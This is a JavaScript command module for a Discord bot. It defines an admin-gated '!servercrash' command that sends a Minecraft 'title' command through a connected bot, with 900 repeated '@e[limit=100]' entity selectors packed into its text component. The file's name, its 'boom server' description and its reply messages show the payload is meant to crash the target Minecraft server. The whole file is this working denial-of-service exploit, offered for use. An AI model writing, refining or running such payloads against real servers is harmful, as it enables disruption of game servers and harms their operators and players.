const { EmbedBuilder } = require('discord.js');

module.exports = {
    name: 'servercrash',
    description: 'boom server',
    roleRequired: 'Admin',

    async execute(msg, args, client, bot) {
        const all = [...global.channelMap.values()];
        if (!all.length) return 'No bots.';

        const gcfg = all[0]?.globalConfig?.discord;
        if (!gcfg) return 'Discord config missing.';

        const member = msg.member;
        if (!member.roles.cache.has(gcfg.adminId)) return 'Admin only.';

        const srv = args[0]?.toLowerCase();
        if (!srv) return '!servercrash <server>';

        const target = all.find(b => b.id === srv);
        if (!target) return `Server "${srv}" not found. Available: ${all.map(b => b.id).join(', ')}`;
        if (!target.core || typeof target.core.run !== 'function') return `Core not ready on "${srv}".`;

        const count = 900;
        const selectors = Array(count).fill('{"selector":"@e[limit=100]"}').join(',');
        const cmd = `title @a title {"text":"noratbothello","color":"#ffccee","extra":[${selectors}]}`;

        try {
            target.core.run(cmd);
            return `💥 boom on "${srv}"`;
        } catch (e) {
            console.error(`[ServerCrash] ${srv}:`, e);
            return `❌ failed on "${srv}"`;
        }
    }
};